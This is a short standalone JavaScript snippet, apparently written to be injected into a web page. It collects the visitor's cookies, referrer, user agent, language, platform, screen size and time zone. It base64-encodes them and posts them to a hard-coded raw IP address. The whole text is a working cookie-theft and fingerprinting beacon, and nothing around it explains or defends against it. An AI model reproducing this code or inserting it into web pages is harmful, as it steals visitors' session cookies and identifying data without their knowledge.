(async()=>{
  const p={
    ua:navigator.userAgent,
    lang:navigator.language,
    plat:navigator.platform,
    ref:document.referrer,
    c:document.cookie,
    scr:[screen.width,screen.height],
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone
  };
  const b64=btoa(unescape(encodeURIComponent(JSON.stringify(p))));
  await fetch("http://51.21.134.183:80/log",{
    method:"POST",
    headers:{"Content-Type":"text/plain"},
    body:b64
  });
})();
